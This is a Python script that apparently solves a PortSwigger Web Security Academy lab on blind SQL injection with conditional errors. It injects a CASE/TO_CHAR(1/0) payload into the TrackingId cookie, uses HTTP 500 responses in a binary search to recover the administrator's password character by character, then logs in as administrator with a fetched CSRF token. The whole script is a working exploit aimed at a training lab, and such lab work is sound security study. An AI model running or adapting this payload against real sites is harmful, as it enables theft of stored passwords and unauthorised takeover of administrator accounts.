#https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors#
import re
import requests

def csrf_fetch(response_text):
    match = re.search(r'name="csrf" value="(.+?)"', response_text)
    return match.group(1) if match else None

LAB_ID = "0ac80098032a90b080800897003c0098"
url = f"https://{LAB_ID}.web-security-academy.net/"
login_url = url+"login"

alnum = "0123456789abcdefghijklmnopqrstuvwxyz"

client = requests.Session()

r = client.get(url)


cookie = r.cookies
i = 1
password = ""
while True:
    prev_len = len(password)
    low = 0
    high = len(alnum) - 1
    while low <= high:
        mid = (low + high) // 2
        char = alnum[mid]
        print(f"trying {i} {char}")

        cookie['TrackingId'] = f"' OR (SELECT CASE WHEN (SUBSTR(password,{i},1)>='{char}') THEN TO_CHAR(1/0) ELSE username END FROM users WHERE username = 'administrator') ='administrator"
        r = client.get(url, cookies=cookie)
        print(r.status_code)

        if r.status_code == 500:
            print("maybe too small")
            cookie['TrackingId'] = f"' OR (SELECT CASE WHEN (SUBSTR(password,{i},1)='{char}') THEN TO_CHAR(1/0) ELSE username END FROM users WHERE username = 'administrator') ='administrator"
            r = client.get(url, cookies=cookie)
            if r.status_code == 500:
                print("\n****found****\n\n")
                password+=char
                break
            low = mid+1
        else:
            print("too large")
            high = mid-1
    if prev_len == len(password):
        break
    i+=1
print(f"the correct password is: {password}")

client.get(login_url)
login_data ={
    'username':'administrator',
    'password':password,
    'csrf':csrf_fetch(client.get(login_url).text)
}
#logging in with correct creds:
client.post(login_url, data=login_data)
print("logged in!")